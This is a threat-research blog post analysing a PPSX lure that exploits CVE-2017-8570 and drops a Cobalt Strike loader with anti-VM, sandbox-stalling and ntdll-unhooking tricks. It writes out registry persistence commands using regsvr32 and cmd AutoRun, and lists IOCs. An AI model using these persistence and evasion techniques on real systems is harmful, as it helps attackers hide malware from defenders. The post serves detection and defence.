src="https://www.deepinstinct.com/image/bltc1c7893c1561616d/662980cc81c884147c380620/fig1-campaign-attack-flow.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 1: Campaign overview</figcaption></div></figure><p></p><p>Deep Instinct Threat Lab observed a malicious PPSX file uploaded from Ukraine to VirusTotal at the end of 2023:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt9b1f379f0880a620" alt="fig2_vt_upload.png" src="https://www.deepinstinct.com/image/blt9b1f379f0880a620/662980cbb0ec774e92d6ebe3/fig2_vt_upload.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 2: VT upload information</figcaption></div></figure><p></p><p>The file name suggests that it was shared via the Signal application; however, this doesn’t necessarily mean the file was initially sent to the victim via the application.</p><p>The PPSX (PowerPoint Slideshow) file appears to be an old instruction manual of the US Army for mine clearing blades (MCB) for tanks.</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt8076071cddf4d2cb" alt="fig3_ppsx_image.png" src="https://www.deepinstinct.com/image/blt8076071cddf4d2cb/662980cc4da2a96906ff3317/fig3_ppsx_image.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 3: PPSX content</figcaption></div></figure><p></p><p>The PPSX file includes a remote relationship to an external OLE object:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltdd378bc3103691ce" alt="fig4_remote_relationship.png" src="https://www.deepinstinct.com/image/bltdd378bc3103691ce/662980cbca88748093ed46c4/fig4_remote_relationship.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 4: Remote relationship</figcaption></div></figure><p></p><p>The use of the “script:” prefix before the https URL indicates the use of <a href="https://justhaifei1.blogspot.com/2017/07/bypassing-microsofts-cve-2017-0199-patch.html" target="_blank" rel="noopener">CVE-2017-8570,</a> which is a bypass to the more known <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0199" target="_blank" rel="noopener">CVE-2017-0199</a>.</p><p>The remote script, which is named &quot;widget_iframe.617766616773726468746672726a6834.html,” was hosted at the domain “weavesilk[.]space,” which is protected by CloudFlare. However, during our analysis, we managed to identify the real hosting behind the domain, which is a Russian VPS provider:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltc6124aad899ad56e" alt="fig5_real_ip.png" src="https://www.deepinstinct.com/image/bltc6124aad899ad56e/662980cbb05441820e9a07a0/fig5_real_ip.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 5: Real domain IP</figcaption></div></figure><p></p><p>The contents of the scriptlet are highly obfuscated:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt2b37b1576b008675" alt="fig6_scriplet.png" src="https://www.deepinstinct.com/image/blt2b37b1576b008675/662980e145f98904f0cf6ed8/fig6_scriplet.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 6: Obfuscated scriplet content</figcaption></div></figure><p></p><p>After de-obfuscation:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltac52ea4fac4551d6" alt="fig7-scriptlet_de-obfuscated.jse.png" src="https://www.deepinstinct.com/image/bltac52ea4fac4551d6/662980dc528fc18f0455be1d/fig7-scriptlet_de-obfuscated.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 7: Scriplet deobfuscated</figcaption></div></figure><p></p><p>The second stage dropper is an HTML file containing JavaScript code that would get executed via Windows <strong>cscript.exe</strong></p><p>It’s responsible for persistency, decoding, and saving the embedded payload to disk.</p><h5>Key Points</h5><ul><li>Drops the payload disguised as Cisco AnyConnect VPN file under the path:<ul><li>C:\Users\&lt;Username&gt;\AppData\Roaming\Cisco\AnyConnect\vpn.sessings</li></ul></li><li>Gains persistence by modifying these registry keys:<ul><li><strong>HKCU\Software\Microsoft\Command Processor\AutoRun: start regsvr32 /s C:\&lt;path&gt;\vpn.sessings -</strong> This would execute the malware every time cmd.exe gets executed.</li><li><strong>HKCU\Software\Microsoft\Windows\CurrentVirsion\Run: cmd /Q /C whoami - </strong>This is actual persistence. It achieves this by executing <strong>whoami</strong>, which triggers the loader every time the system starts.</li></ul></li></ul><p>This persistence technique is unusual and could cause the payload to be executed multiple times unnecessarily, though because it looks benign, the persistence would be harder to spot by incident response and could also cause a privilege escalation if a high-privilege user or process executes cmd.exe.</p><h5>DLL Payload Analysis</h5><p>The sample includes a loader/packer Dynamic Link Library (DLL) named <strong>vpn.sessings</strong> that loads a Cobalt Strike Beacon into memory and awaits instructions from the C&amp;C server</p><p>Cobalt Strike was already <a href="https://www.deepinstinct.com/blog/cobalt-strike-post-exploitation-attackers-toolkit">analyzed</a> many times, so we won’t go into detail, but the loader contained a couple of interesting behaviors.</p><h6>Loader Analysis</h6><p>The sample is a DLL that executes using Regsvr32.</p><p>Most of the important logic is inside <strong>DllRegisterServer</strong>.</p><p>The exported methods strangely have names of undocumented low-level WinAPI calls (Nt, Zw, Rt), but most were empty and unused.</p><p></p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt4709165469601da7" alt="fig8-loader_export_table.jse.png" src="https://www.deepinstinct.com/image/blt4709165469601da7/662980dc81c8846696380625/fig8-loader_export_table.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 8: Loader export table</figcaption></div></figure><p></p><p>The loader attempts to terminate the parent process (anti-debugging), iterating over running processes and looking for itself. Then, it attempts to terminate its parent process:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltc424f7c746d42655" alt="fig9-terminate_parent.jse.png" src="https://www.deepinstinct.com/image/bltc424f7c746d42655/662980dc58ce883b0fc30d69/fig9-terminate_parent.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 9: Terminate parent</figcaption></div></figure><p></p><p>When it is executed from the “Command Processor” registry key, it runs under a “<strong>Non-Existent Process</strong>,” meaning there is no parent process it could terminate. However, while debugging, it terminates together with the debugger, slowing analysis – and annoys the researcher!</p><img asset_uid="bltc9bae58f8841bd48" src="https://www.deepinstinct.com/image/bltc9bae58f8841bd48/66298108ac4b002087c435ca/figX-annoyed-researcher.png" alt="figX-annoyed-researcher.png" height="auto"/><p></p><h6><em>Stalling Execution (Possible Sandbox Evasion)</em></h6><p>The loader dynamically loads the low-level <strong>NtDelayExecution </strong>WinAPI Call, and stalls for 20 seconds without any clear functional reason.</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltb582b8be7f4ba7c2" alt="fig10-delay_execution.jse.png" src="https://www.deepinstinct.com/image/bltb582b8be7f4ba7c2/662980dc776d0c5c3124e7d3/fig10-delay_execution.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 10: Delay execution</figcaption></div></figure><p></p><p>Possible explanations could be to either slow debugging or evade sandboxes.</p><p>It may exploit the fact that preventive sandbox emulations need to deal with large volumes of malware and can only last for short periods of time (2-5 min).</p><p>Most solutions skip long sleeps/delays, but here it was executed 20 times, ­each for a second, possibly trying to bypass automatic skips while also delaying the execution slightly.</p><p>One-second delays look like a short amount, but because these calls are usually hooked for monitoring, each call takes longer and could exclude important indicators from emulation windows.</p><h6><em>Check </em><em><strong>CPUID</strong></em><em> (Anti-VM)</em></h6><p>The loader executes <strong>CPUID</strong> using an inline ASM instruction to determine whether the malware is being executed in a virtual machine.</p><p>The <strong>CPUID </strong>x86 instruction returns a <strong>negative </strong>value if executed in a <strong>VM </strong>(the 2^31 bit is set to 1; <strong>signed</strong> values over <em>0x80000000</em> are negative).</p><p>We can see in the instruction below that it would return true if <strong>CPUID </strong>returns a positive number:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt52ebfe0b956dc5cf" alt="fig11-check_vm.jse.png" src="https://www.deepinstinct.com/image/blt52ebfe0b956dc5cf/662980f3528fc1517055be22/fig11-check_vm.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 11: Checks if the malware executed inside a VM</figcaption></div></figure><p></p><p>If this condition is <strong>false</strong>, it simply <strong>exits</strong>, but the interesting thing is that it performs this check in other places. This includes a check at <strong>DllEntryPoint</strong> (executed before <strong>DllRegisterServer)</strong>, which assigns a global variable that can later change some of the behavior.</p><h6><em>Unhooking </em><em><strong>NTDLL </strong></em><em>(Anti-AM)</em></h6><p>The dynamic link library <strong>ntdll.dll</strong> is the lowest-level Windows API call interface between User Mode and Kernel Mode.</p><p>Because of that, anti-malware vendors usually place hooks inside various calls to monitor for malicious behavior. If malware wants to avoid detection, it needs to find a way to circumvent these protections.</p><p>The idea is straightforward: a pre-loaded ntdll.dll in memory contains inline hooks inside various API calls, which the malware needs to bypass or overwrite to avoid detection.</p><p>In the screenshot below, we can see a memory mapping of <strong>ntdll.dll</strong> from <strong>disk</strong>, together with the fetching of the <strong>loaded module </strong>of <strong>ntdll.dll</strong> from the memory of the running process:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltac0a764a87f7a127" alt="fig12-loading_both_dlls.jse.png" src="https://www.deepinstinct.com/image/bltac0a764a87f7a127/662980f4e7ce95a585deac72/fig12-loading_both_dlls.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 12: Loading both ntdlls</figcaption></div></figure><p></p><p>They are called:</p><ul><li><strong>MemNTDLL : </strong>for the loaded module from memory</li><li><strong>DiskNTDLL : </strong>for the copy of ntdll.dll from disk</li></ul><p>This looks like obvious unhooking, but the rest of the code was overwhelmingly complicated, and for some reason, it didn’t unhook in our tests.</p><p>It took some time, and after digging deeper, we’ve encountered a couple of additional tricks the malware authors did to slow analysis.</p><p>I’ve divided these delaying techniques into several points:</p><p><strong>1. Over-complicated bloat code</strong></p><p>It’s difficult to understand the exact purpose, but<strong> </strong>we suspect it was done intentionally to waste threat analysts’ time, as we can see in the example code below:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt52d92beb3dd8d7dc" alt="fig13-nonsense_code.jse.png" src="https://www.deepinstinct.com/image/blt52d92beb3dd8d7dc/662980f3fb977c0c1936bba6/fig13-nonsense_code.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 13: Nonsense code</figcaption></div></figure><p></p><p>This piece of code is called from the function responsible for unhooking ntdll.dll, and the variables <strong>lp_text_base_DiskNTDLL/MemNTDLL</strong> are LONG_PTR addresses of both DLLs in memory.</p><p>Because <strong>MemNTDLL</strong> always wants to be loaded by the operating system at the highest User Space module address – 0x77000000 (32-bit) above – with some variation due to ASLR, the condition <strong>lp_text_base_DiskNTDLL</strong> &gt; <strong>lp_text_base_MemNTDLL</strong> would <strong>never</strong> be true.</p><p>At least from this context.</p><p>This function also gets called from other locations full of bloat code, not related to unhooking.</p><p><strong>2. Hidden additional VM check (as mentioned above)</strong></p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt7c9186bdd9ac1ad2" alt="fig14-DllEntryPoint_CPUID.jse.png" src="https://www.deepinstinct.com/image/blt7c9186bdd9ac1ad2/662980f3b8b5ce2379dc2937/fig14-DllEntryPoint_CPUID.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 14: DllEntryPoint check VM</figcaption></div></figure><p></p><p>If the check is <strong>false</strong>, it does not unhook and instead diverts the execution flow into ... can you guess?</p><p>More bloat code:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt37ed9ef14f6b2947" alt="fig15-unhook_and_bloat_code.jse.png" src="https://www.deepinstinct.com/image/blt37ed9ef14f6b2947/662980f458ce882287c30d71/fig15-unhook_and_bloat_code.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 15: Unhook and bloat code</figcaption></div></figure><p></p><p>Malware developers are known to create dummy behavior to slow down analysis.</p><p>It’s an effective trick, and knowing that, it’s better to move on without diving into overly complicated code with no clear purpose, especially if it doesn’t get executed under normal conditions.</p><p><strong>3. Structs with manual offsets</strong></p><p>The authors also used arbitrary offsets while manually loading various PE structures to make the reconstruction more difficult:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltaf62504dce96670d" alt="fig16-arbitrary_offsets.jse.png" src="https://www.deepinstinct.com/image/bltaf62504dce96670d/6629810824e18134c8acf093/fig16-arbitrary_offsets.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 16: Arbitrary offsets</figcaption></div></figure><p></p><p>After reconstruction, it’s easier to see that it looks for the <strong>.text</strong> section (containing all the function implementations), changes the permissions to <strong>PAGE_EXECUTE_READWRITE</strong>, and then sends it to be overwritten with the original ntdll.dll:IOCs:</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltb64ca9b06ed14593" alt="fig17-after_reconstruction.jse.png" src="https://www.deepinstinct.com/image/bltb64ca9b06ed14593/66298108b0544189de9a07a9/fig17-after_reconstruction.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 17: After reconstruction</figcaption></div></figure><p></p><h6><em>Decrypts Payload (Cobalt Strike)Network</em></h6><p>Uses a standard decryption routine</p><ul><li>Hash base_data/key_seed</li><li>Derive key from hash</li><li>Decrypt:</li></ul><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt2dcc6aab23066577" alt="fig18-decrypt_payload.jse.png" src="https://www.deepinstinct.com/image/blt2dcc6aab23066577/66298108ca8874915ded46c8/fig18-decrypt_payload.jse.png" width="auto" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 18: Decrypt payload (Beacon)</figcaption></div></figure><p></p><h6><em>Self-DLL Injects Cobalt Strike</em></h6><p>This is meant to hide the payload, avoid storing the file on disk (file-less), bypass remote injection heuristics, and, as always, complicate the analysis.</p><p>The procedure is as follows:</p><ul><li><strong>OpenProcess</strong></li><li><strong>AllocateMemory</strong> inside it</li><li><strong>WriteProcessMemory</strong> with the payload</li><li><strong>CreateRemoteThread</strong> inside itself</li><li><strong>WaitForSingleObject</strong> until that thread finishes</li></ul><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt4284fcffd11b6423" alt="fig19-self_dll_injection.jse.png" src="https://www.deepinstinct.com/image/blt4284fcffd11b6423/66298108a02ad7fa87eea4c7/fig19-self_dll_injection.jse.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 19: Self DLL injection</figcaption></div></figure><p></p><h6><em>Extracted Cobalt Strike Config:</em></h6><p>The Cobalt Strike config contains a public key for asymmetric key exchange for encrypted communications with the C&amp;C.</p><p>The <strong>licence_id : 0</strong> indicates that this is a cracked version of Cobalt Strike.</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt1b287ae7003870ef" alt="fig20-ExtractedConfig.png" src="https://www.deepinstinct.com/image/blt1b287ae7003870ef/6629867f81c8845dde38064c/fig20-ExtractedConfig.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 20: Extracted config</figcaption></div></figure><p></p><p>The Cobalt Beacon has a detailed config with the C&amp;C address/domain name, URI, public key, and even the process that it would inject into (dllhost.exe).</p><p>It awaits instruction from the C&amp;C server, located at <strong>petapixel[.]fun</strong> (disguised as a popular photography site), also hidden behind Cloudflare, and registered in an EU country with GDPR masking, making it more difficult to investigate.</p><p>It did mention it was registered in <strong>Warsaw, Poland</strong>.</p><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt0180209fb534a61f" alt="fig21-location.png" src="https://www.deepinstinct.com/image/blt0180209fb534a61f/6629867f210d90e2833a5678/fig21-location.png" height="auto" style="text-align:center"/><figcaption style="text-align:center">Figure 21: Registration location</figcaption></div></figure><p></p><h5>Conclusion</h5><p>The Deep Instinct Threat Lab could not attribute these attacks to any known threat actor or exclude the possibility that this was part of a red team exercise.</p><p>The evidence shows that this sample was uploaded from Ukraine, the second stage (weavesilk[.]space) was hosted and registered under a Russian VPS provider, and the Cobalt beacon C&amp;C (petapixel[.]fun) was registered in Warsaw, Poland.</p><p>The binary (<em>vpn.sessings</em>) contains a custom loader/packer for the Cobalt Strike Beacon with various techniques to slow analysis and <a href="/endpoint-detection-response" target="_self">bypass cybersecurity solutions</a>. Most of the techniques are not new but could be unique enough to be used as a fingerprint.</p><p>The Cobalt Strike Beacon by itself is a professional pen-testing tool designed for evaluating computer security by red teams, but this is the leaked cracked version, so we can’t trace it to any legitimate user.</p><p>Cobalt is an advanced tool with a wide range of capabilities, such as stealing sensitive data, elevating privileges, propagating to other computers in the network, downloading tools, and more. Without additional clues, it’s hard to understand the exact purpose of the attack.</p><p>The lure contained military-related content, suggesting it was targeting military personnel. But the domain names weavesilk[.]space and petapixel[.]fun are disguised as an obscure generative art site (http://weavesilk.com) and a popular photography site (https://petapixel.com). These are unrelated, and it’s a bit puzzling why an attacker would use these specifically to fool military personnel.</p><p></p><p>As of the day of discovery, the loader was undetectable by most engines, while Deep Instinct prevented it on day 0.</p><p></p><p></p><h6>MITRE</h6><table style="width:100%"><colgroup data-width="651.004557013671"><col style="width:21.351778648221355%"/><col style="width:16.436283563716437%"/><col style="width:21.65897834102166%"/><col style="width:40.55295944704055%"/></colgroup><thead class="bg-grey"><tr><th><p>Tactic</p></th><th><p>Technique</p></th><th><p>Description</p></th><th><p>Observable</p></th></tr></thead><tbody><tr><td><p>Initial Access</p></td><td><p>T1566</p></td><td><p>Phishing</p></td><td><p>PowerPoint signal-2023-12-20-160512.ppsx containing RELS exploit</p></td></tr><tr><td><p>Execution</p></td><td><p>T1059.007</p></td><td><p>Command and Scripting Interpreter: JavaScript</p></td><td><p>widget_iframe.617766616773726468746672726a6834.html containing obfuscated JavaScript</p></td></tr><tr><td><p>Persistence</p></td><td><p>T1547.001</p></td><td><p>Registry Run Keys</p></td><td><p>HKCU\Software\Microsoft\Windows\CurrentVirsion\Run: cmd /Q /C whoami</p></td></tr><tr><td><p>Persistence</p></td><td><p></p></td><td><p>Event-Triggered Execution</p></td><td><p><em>HKCU\Software\Microsoft\Command Processor\AutoRun: start regsvr32 /s C:\&lt;path&gt;\vpn.sessings</em></p><p>New sub-technique submitted to MITRE</p></td></tr><tr><td><p>Defensive Evasion</p></td><td><p>T1218.010</p></td><td><p>System Binary Proxy Execution: Regsvr32</p></td><td><p>start regsvr32 /s C:\&lt;path&gt;\vpn.sessings</p></td></tr><tr><td><p>Defensive Evasion</p></td><td><p>T1055</p></td><td><p>Process Injection</p></td><td><p>Performed a self-injection after unpacking the Cobalt Strike Beacon, using the classic <strong>CreateRemoteThread</strong> method</p></td></tr><tr><td><p>Defensive Evasion</p></td><td><p>T1027.002</p></td><td><p>Software Packing</p></td><td><p>Unpacked the Cobalt Beacon using <strong>CryptDecrypt</strong></p></td></tr><tr><td><p>Discovery</p></td><td><p>T1057</p></td><td><p>Process Discovery</p></td><td><p>Iterated the running processes to terminate its parent for anti-debugging</p></td></tr><tr><td><p>Defensive Evasion</p></td><td><p>T1497</p></td><td><p>Virtualization/Sandbox Evasion</p></td><td><p>Performed <strong>NtDelayExecution</strong> to stall execution, possibly to evade automatic sandbox emulation by exploiting time constraints</p></td></tr><tr><td><p>Command and Control</p></td><td><p>T1573</p></td><td><p>Encrypted Channel</p></td><td><p>C&amp;C communication using HTTPS on port 443</p></td></tr></tbody></table><p></p><h6>IOCs</h6><p>weavesilk[.]space<br/>109.107.178[.]241<br/>petapixel[.]fun</p><p></p><table style="width:100%"><thead class="bg-grey"><tr><th><p>SHA256</p></th><th><p>Description</p></th></tr></thead><tbody><tr><td><p>b0b762106c22e44f7acaa3177baabd64ea28990d16672e1f902b53f49b2027c4</p></td><td><p>signal-2023-12-20-160512.ppsx</p></td></tr><tr><td><p>0bc0e9410f4a9703ff0b5af7ec9383a1cc929572ade09fbd2c69ed2ae1486939</p></td><td><p>widget_iframe.617766616773726468746672726a6834.html</p></td></tr><tr><td><p>976f57442452cd54cada011c565ada0c01f5b1460e31ee6cea330d210d3e8f50</p></td><td><p>vpn.sessings (cobalt strike loader DLL)</p></td></tr></tbody></table><p></p></div></div></div></div><div class="back-page container mx-auto"><div class="max-w-blog w-full mx-auto pt-9 border-t-2 border-blue"><div class="flex justify-between mb-12 md:mb-16"><a class="inline-block font-bold uppercase text-cta tracking-widder undefined button_btn--link__RQBF4 undefined button_btn--arrow-left__8dYK2 undefined button_btn--arrow-left-blue__c3n8m hover:underline mt-2" href="/blog">Back To Blog<i class="button_btn__icon__m_ZnD"><svg fill="currentColor" width="16" height="10" viewBox="0 0 16 10" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><g stroke="currentColor"><path d="M10 2l4 3-4 3M13 5H0"></path></g><defs><clipPath id="clip0"><path fill="currentColor" d="M0 0h15v9H0z" transform="rotate(-180 8 5)"></path></clipPath></defs></svg></i></a><div class="social-share SocialShare_social-share__4Q7V0"><button aria-label="linkedin" class="react-share__ShareButton social-share__btn linkedin hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg fill="currentColor" width="22" height="22" viewBox="0 0 22 22" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M4.58333 2.3913C4.58333 3.73043 3.575 4.78261 2.29167 4.78261C1.00833 4.78261 0 3.73043 0 2.3913C0 1.05217 1.00833 0 2.29167 0C3.575 0 4.58333 1.05217 4.58333 2.3913ZM4.58333 6.69565H0V22H4.58333V6.69565ZM11.9167 6.69565H7.33333V22H11.9167V13.9652C11.9167 9.46957 17.4167 9.08696 17.4167 13.9652V22H22V12.3391C22 4.78261 13.8417 5.06956 11.9167 8.8V6.69565Z" fill="currentColor"></path></svg></button><button aria-label="twitter" class="react-share__ShareButton social-share__btn twitter hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg fill="currentColor" width="23" height="19" viewBox="0 0 23 19" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M7.23329 19C15.9129 19 20.6595 11.6908 20.6595 5.35298C20.6595 5.14532 20.6553 4.93872 20.6459 4.73292C21.5673 4.05595 22.3683 3.21094 23 2.24946C22.1545 2.63129 21.2447 2.88841 20.2902 3.00434C21.2643 2.4106 22.0125 1.47093 22.3654 0.35098C21.4535 0.900584 20.4437 1.29996 19.3691 1.51533C18.5077 0.583106 17.2813 0 15.9244 0C13.3182 0 11.2048 2.14816 11.2048 4.79593C11.2048 5.17244 11.2464 5.53831 11.327 5.88956C7.40542 5.68934 3.92781 3.78048 1.60068 0.878514C1.19495 1.58712 0.961353 2.41086 0.961353 3.28911C0.961353 4.95308 1.79452 6.42214 3.06142 7.28178C2.28736 7.25758 1.56014 7.04114 0.924206 6.68165C0.92316 6.7016 0.92316 6.7218 0.92316 6.74281C0.92316 9.06593 2.55 11.0054 4.70893 11.4449C4.31261 11.5547 3.89564 11.6137 3.46505 11.6137C3.16108 11.6137 2.86548 11.5829 2.57799 11.5273C3.17861 13.4327 4.92082 14.8196 6.98635 14.8587C5.37102 16.1454 3.33635 16.9119 1.12563 16.9119C0.745015 16.9119 0.369369 16.8899 0 16.8455C2.08829 18.2058 4.56793 19 7.23329 19Z" fill="currentColor"></path></svg></button><button aria-label="facebook" class="react-share__ShareButton social-share__btn facebook hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg fill="currentColor" width="13" height="26" viewBox="0 0 13 26" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M3.25 8.66667H0V13H3.25V26H8.66667V13H12.5667L13 8.66667H8.66667V6.825C8.66667 5.85 8.88333 5.41667 9.85833 5.41667H13V0H8.88333C4.98333 0 3.25 1.73333 3.25 4.98333V8.66667Z" fill="currentColor"></path></svg></button></div></div></div></div></div></main><footer class="Footer_footer__OQpsI bg-blue-dark text-white py-10 relative z-1"><div class="container--full"><div class="container mx-auto"><div class="footer__top"><div class="footer__menus grid grid-cols-1 gap-0 lg:grid-cols-4 lg:gap-4 2xl:grid-cols-5 mb-4"><div class="footer__logo mb-10"><a class="text-white" href="/"><svg fill="currentColor" width="135" height="67" viewBox="0 0 994 471.4" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M964.49 294.51h1.38v-16.97h6.88v-1.38h-15.14v1.38h6.88v16.97zM31.01 309.46h42.48v161.19H31.01z" fill="currentColor"></path><path d="M226.82 324.53c-10.25-8.72-27.69-13.27-53.1-13.27h-82.3v161.19h42.85V345.77h36c13.65 0 21.24 1.14 25 4.93 4.55 4.55 6.83 12.52 6.83 24.65v97.1h40.58V370c.07-21.2-5.24-36-15.86-45.47Z" fill="currentColor" transform="translate(-3 -1.8)"></path><path d="M521.06 309.46h42.85v161.19h-42.85z" fill="currentColor"></path><path d="M714.6 324.53c-10.25-9.1-26.94-13.27-52-13.27h-81.13v161.19h39.45V345.77h38.3c12.9 0 20.1 1.14 23.89 4.93 4.18 4.18 6.07 11.38 6.07 24.65v97.1h40.21V370c0-22-4.55-36.75-14.79-45.47ZM939.74 277.51h-40.59v33.37h-73.57c-15.17 0-26.55.77-36 3.8a62.75 62.75 0 0 0-25 15.17 74.23 74.23 0 0 0-17.83 27.69 99.23 99.23 0 0 0-6.45 35.64 92.67 92.67 0 0 0 6.45 34.14 75.85 75.85 0 0 0 17.83 27.31c6.45 6.07 14 10.24 24.65 14 9.48 3 21.62 3.8 36.79 3.8h57.65v-34.49h-44.44c-12.13 0-19.34-.38-23.89-1.14s-10.62-2.28-14-4.18c-6.82-4.17-10.24-6.07-13.27-12.89-3.41-6.82-4.93-15.55-4.93-26.17 0-18.58 4.17-31.49 12.13-39.07 8.34-7.58 23.51-8.34 44-8.34h60.31v78.12c0 16.31 3.8 27.69 12.13 36.79 8 8.35 19 12.14 36 12.14H986v-28.07h-15.92c-11 0-19-2.64-23.51-7.58-4.55-5.31-6.83-14.41-6.83-26.92v-64.1h49.69V312h-49.69ZM464.36 272.9l-40.58 24.29v12.92H309.63c-20.48 0-34.51 4.17-43.62 12.13-9.11 8.34-13.66 20.85-13.66 38.31s3.8 29.58 11.38 36c7.59 6.83 22.76 10.24 44.76 10.24h37.93c9.1 0 15.17 1.15 19 3.8 4.17 3 6.45 7.59 6.45 13.65s-2.28 10.24-6.45 13.27c-4.55 3-11.75 3.8-19 3.8h-90.65v30.72h111.51c13.66 0 23.52-4.17 31.49-12.89 8.34-9.49 12.51-21.24 12.51-36 0-15.56-4.55-26.56-14-34.9-8.72-8-22-11.38-40.58-11.38h-39.85c-8.73 0-14-2.65-16.69-4.55-3.79-2.65-5.69-7.58-5.69-13.27 0-6.45 2.28-10.62 6.45-13.27 3.8-2.28 12.52-3.41 25.41-3.41h97.09v81.16c0 16.31 3.79 28.07 12.14 36.79 8 8.34 18.95 12.14 35.64 12.14l38.68-.07v-28.77h-16.31c-11 0-18.59-2.66-23.13-8-4.55-4.93-6.45-14-6.45-26.93v-67.09h45.89v-31.48h-45.52ZM995 277.5c-.92 0-1.46.51-1.91 1.89 0 0-5 14.92-6 14.92s-6-14.92-6-14.92c-.47-1.37-1-1.89-1.92-1.89-2.29 0-2 1.84-2 1.84v17h1.38v-17c0-.46.77-.9 1.29.15s5.17 16.81 7.26 16.81 6.74-15.75 7.27-16.81 1.29-.62 1.29-.15v17H997v-17s.26-1.84-2-1.84Z" fill="currentColor" transform="translate(-3 -1.8)"></path><path d="M503.43 77.18h-80.3v204.67L464 257.23v-21.32h37.12c15.91 0 28.79-1.9 38.26-5.68a58.4 58.4 0 0 0 24.63-18.56 73 73 0 0 0 12.87-23.86 99.81 99.81 0 0 0 4.21-28.81c-.39-25.77-7.21-45.85-20.84-60.25s-32.59-21.57-56.82-21.57ZM526.91 192c-7.2 7.19-19.7 11-36.75 11h-26.52v-92.86h29.93c16.29 0 28 3.41 34.47 10.23 6.82 6.82 9.85 18.56 9.85 34.85.01 17.43-3.78 29.55-10.98 36.78ZM228.4 110.14a46 46 0 0 1 46.21 44.32l.38 4.17a87.25 87.25 0 0 0 6.06 29.17 88 88 0 0 0 17.05 25.38 83.12 83.12 0 0 0 25.38 17 81.12 81.12 0 0 0 31.07 6.06h55.3v-33h-55.3A46 46 0 0 1 308.33 159l-.37-4.17a87.26 87.26 0 0 0-6.07-29.17 87.74 87.74 0 0 0-17-25.38 82.84 82.84 0 0 0-25.39-17 78.54 78.54 0 0 0-31.06-6.44H172v33.33h56.4Z" fill="currentColor" transform="translate(-3 -1.8)"></path><path d="m318.18 156 .38 4.16a27.28 27.28 0 0 0 2.27 11h89v-31.48h-93.17a118.19 118.19 0 0 1 1.52 16.32ZM264.77 161.28l-.38-4.17c-.37-6.06-1.89-12.12-5.3-17H172v31.44h93.19c-.05-3.83-.42-7.24-.42-10.27ZM315.54 132.49a46.41 46.41 0 0 1 39.4-22h54.91V77.18h-54.92a79.91 79.91 0 0 0-31.06 6.44 74.14 74.14 0 0 0-25 16.67 93.47 93.47 0 0 1 12.88 21.22 95 95 0 0 1 3.79 10.98ZM268.18 181a46.42 46.42 0 0 1-39.4 22h-56.71v32.56h56.7c11.37 0 21.59-1.89 31.06-6.06a74.14 74.14 0 0 0 25-16.67A93.47 93.47 0 0 1 